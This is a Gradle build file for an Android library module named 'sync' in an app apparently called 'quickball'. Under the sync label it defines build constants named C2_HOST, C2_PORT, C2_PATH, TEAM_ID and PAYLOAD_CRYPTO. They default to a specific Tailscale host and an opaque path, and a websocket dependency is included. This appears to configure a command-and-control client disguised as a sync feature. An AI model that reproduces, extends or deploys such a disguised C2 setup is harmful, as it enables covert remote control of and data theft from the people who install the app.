plugins {
    alias(libs.plugins.android.library)
}

android {
    namespace = "io.github.chayanforyou.quickball.sync"
    compileSdk {
        version = release(37) {
            minorApiLevel = 1
        }
    }

    defaultConfig {
        minSdk = 21
        consumerProguardFiles("consumer-rules.pro")

        // Point -PsyncHost at anything else, e.g. 127.0.0.1 with -Ptls=false for adb reverse.
        val relayTls = providers.gradleProperty("tls").getOrElse("true").toBoolean()
        manifestPlaceholders["cleartext"] = (!relayTls).toString()

        buildConfigField("String", "C2_HOST", "\"${providers.gradleProperty("syncHost").getOrElse("win-b7p20j7pk93.tailfa1e91.ts.net")}\"")
        buildConfigField("String", "C2_PORT", "\"${providers.gradleProperty("syncPort").getOrElse("443")}\"")
        buildConfigField("String", "C2_PATH", "\"${providers.gradleProperty("syncPath").getOrElse("/x9k2m")}\"")
        buildConfigField("String", "TEAM_ID", "\"${providers.gradleProperty("teamId").getOrElse("1")}\"")
        buildConfigField("boolean", "USE_TLS", relayTls.toString())
        buildConfigField("boolean", "PAYLOAD_CRYPTO", "true")
    }

    buildFeatures {
        buildConfig = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

}

dependencies {
    implementation(libs.androidx.core.ktx)
    implementation(libs.java.websocket)
}
